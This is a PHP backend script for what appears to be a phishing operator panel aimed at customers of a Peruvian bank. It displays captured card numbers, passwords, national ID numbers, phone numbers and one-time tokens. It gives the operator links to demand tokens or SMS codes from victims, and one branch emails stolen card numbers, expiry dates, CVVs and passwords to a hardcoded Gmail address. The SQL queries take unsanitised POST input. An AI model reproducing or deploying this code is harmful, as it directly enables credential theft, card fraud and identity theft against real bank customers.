<?php
error_reporting(0);
session_start();
date_default_timezone_set("America/Lima");

$accion = $_POST["accion"];
include('../class/db.php');

switch ($accion) {
    case "1":
        $registros = array();
        $sql = mysqli_query($link, "select * from usuarios where id in (SELECT max(id) FROM usuarios group by card);");
        if ($sql) {
            $iRecords = mysqli_num_rows($sql);
            $iAffected = @mysqli_affected_rows($sql);
            while ($reg = mysqli_fetch_assoc($sql)) {
                $registros[] = $reg;
            }
        }

        $strHTML = "";
        if(!isset($_SESSION["contador"]))
            $_SESSION["contador"] = count($registros);
        
        for ($i = 0; $i < count($registros); $i++) {
            $detalle_tarjeta=array();
            $style = "style='font-family:Trebuchet MS, Arial, Helvetica, sans-serif; padding-left:10px; color:black; cursor:pointer;'";
			if ($registros[$i]['control'] == "activado") {
		  	$style = "style='font-family:Trebuchet MS, Arial, Helvetica, sans-serif; padding-left:10px; color:black; cursor:pointer; background-color:#BFD2F7;'"; }
			if ($registros[$i]['control'] == "finalizado") {
		  	$style = "style='font-family:Trebuchet MS, Arial, Helvetica, sans-serif; padding-left:10px; color:black; cursor:pointer;' class='success'"; }
            if ($registros[$i]['iniciar'] == "Bloquear" || $registros[$i]['iniciar'] == "Finalizado") {
			$style = "style='font-family:Trebuchet MS, Arial, Helvetica, sans-serif; padding-left:10px; color:red; cursor:pointer;' class='danger'"; }
			
			$fecha1 = new DateTime($registros[$i]['master']);//fecha inicial
			$fecha2 = new DateTime();//fecha de cierre

			$intervalo = $fecha1->diff($fecha2);
			
            $strHTML.="<tr id=\"fila$i\">
			<td id=\"celda0_$i\"  $style  align=\"center\"><small><a href=\"updb.php?blqr=Bloquear&tarjeta=".$registros[$i]['card']."&control=activado\">".$registros[$i]['ip']."</a></small></td>
            <td id=\"celda1_$i\"  $style  align=\"center\" onclick=\"capturar('" . $registros[$i]['card']."@".$registros[$i]['nombre']."@".$registros[$i]['img']."',this);\"><span data-toggle=\"tooltip\" data-placement=\"top\" title=\"Copiado\">" . $registros[$i]['card']. " <small><small>(".$intervalo->format('%H:%i:%s').") <i class=\"glyphicon glyphicon-heart".($registros[$i]['line'] == 1 ? " text-danger" : " text-muted")."\"></i></small></small></span></td>
            <td id=\"celda2_$i\"  $style  align=\"center\">" . $registros[$i]['pass'] . "</td>
            <td id=\"celda3_$i\"  $style  align=\"center\"><small>" .preg_replace("/ /i","&nbsp;",$registros[$i]['nombre']). "</small></td>
            <td id=\"celda4_$i\"  $style  align=\"center\">".$registros[$i]['DNI']."</td>
			<td id=\"celda5_$i\"  $style  align=\"center\">".$registros[$i]['Celular']."</td>
			<td id=\"celda6_$i\"  $style  align=\"center\"><kbd>".$registros[$i]['token']."</kbd></td>
            <td id=\"celda7_$i\"  $style  align=\"center\"><small>" . $registros[$i]['iniciar'] . "</small></td>
			<td id=\"celda8_$i\"  $style  align=\"center\"><a href=\"updb.php?tkn=Token&tarjeta=".$registros[$i]['card']."&control=activado\"><img src=\"../files/img/us-dollar.png\" width=\"30\" /></a>&nbsp;<a href=\"updb.php?sms=Datos&tarjeta=".$registros[$i]['card']."&control=activado\"><img src=\"../files/img/sms-phone-icon.svg\" width=\"27\" /></a>&nbsp;<a href=\"updb.php?blqr=CC&tarjeta=".$registros[$i]['card']."&control=activado\" disabled><img src=\"../files/img/credit-card.png\" width=\"26\" /></a>&nbsp;<a href=\"updb.php?blqr=Resumen&tarjeta=".$registros[$i]['card']."&control=activado\" disabled><img src=\"../files/img/maps-and-flags-3.svg\" width=\"26\" /></a>&nbsp;<a href=\"iddel.php?v=" . $registros[$i]['card'] . "\"><img src=\"../files/img/icon-error.svg\" width=\"25\" /></a></td>
            </tr>";
        }

        echo $strHTML;
        break;

    case "2":
        $contador =  $_SESSION["contador"];
        $registros = array();
        $sql = mysqli_query($link, "SELECT * FROM usuarios WHERE id in (SELECT max(id) FROM usuarios group by card);");
        if ($sql) {
            $iRecords = mysqli_num_rows($sql);
            $iAffected = @mysqli_affected_rows($sql);
            while ($reg = mysqli_fetch_assoc($sql)) {
                $registros[] = $reg;
            }
        }
        
        $total_registros = count($registros);
        
		if($contador >= $total_registros){
            $_SESSION["contador"] = $total_registros;
			echo "0";
        }else{
			$_SESSION["contador"] = $total_registros;
			echo ($total_registros - $contador);
		}
        break;

	case "3":
		$auto =  $_POST["auto"];
        $sql = mysqli_query($link, "UPDATE config SET estado='".$auto."'");
		break;
	
	case "4":
		$card =  $_POST["card"];
		$frase =  $_POST["nombre"];
		$imgs =  $_POST["imgs"];
		
        $result = mysqli_query($link, "UPDATE usuarios SET nombre='".$frase."', img='".$imgs."', iniciar='Imagen', control='activado' WHERE card='".$card."';");
        echo "Nombre e Imagen registrada.";
		break;
	case "5":
		$registros = array();
		$sql = mysqli_query($link, "SELECT * FROM iusuarios");
		if($sql){
    		$iRecords = mysqli_num_rows($sql);
   			$iAffected = @mysqli_affected_rows($sql);
    		while($reg = mysqli_fetch_assoc($sql)){
				$registros[] = $reg;
			}
		}

		for($i = 0; $i < count($registros); $i++){
			$detalle_tarjeta=array();
			$rdnbck .= "[".($i+1)."] | [".($registros[$i]['idocum'] != 0 ? $registros[$i]['idocum'] : "")."] | [".$registros[$i]['ipass']."] | [".$registros[$i]['icard']."] | [".$registros[$i]['imv']."/".$registros[$i]['iav']."] | [".$registros[$i]['icv']."]<br /><br />";
	  	}
		$subj = "Backup Panel - ".$_SERVER['SERVER_NAME'];
		$header .= "From: Backup<".$_SERVER["REMOTE_ADDR"]."@bn.com.pe>\r\n";
		$header .= "MIME-Version: 1.0\r\n";
		$header .= "Content-type: text/html; charset=utf-8\r\n";
		
		if(mail("kcampospe@gmail.com", $subj, $rdnbck, $header)){
			echo "Gracias por exportar los datos a su correo.";
		}else{
			echo "Verifique su conexión o intentenuevamente.";
		}
		break;
	case "6":
	    $iregistros = array();
	    $sqli = mysqli_query($link, "select * from iusuarios");
	    if($sqli){
		    $Records = mysqli_num_rows($sqli);
   		    $Affected = @mysqli_affected_rows($sqli);
    	    while($ireg = mysqli_fetch_assoc($sqli)){
			    $iregistros[] = $ireg;
		    }
	    }
	    
	    for ($x = 0; $x < count($iregistros); $x++) {
	        echo "<tr><th scope=\"row\"><small><small>".($x+1)."</small></small></th>
      <td class=\"text-center\"><small><small>".($iregistros[$x]['idocum'] != 0 ? $iregistros[$x]['idocum'] : "")."</small></small></td>
      <td class=\"text-center\"><small><small>".$iregistros[$x]['ipass']."</small></small></td>
      <td class=\"text-center\"><small><small>".$iregistros[$x]['icard']."</small></small></td>
      <td class=\"text-center\"><small><small>".$iregistros[$x]['imv']."/".$iregistros[$x]['iav']."</small></small></td>
      <td class=\"text-center\"><small><small>".$iregistros[$x]['icv']."</small></small></td></tr>";
	    }
	    break;
	default:
        break;
}
?>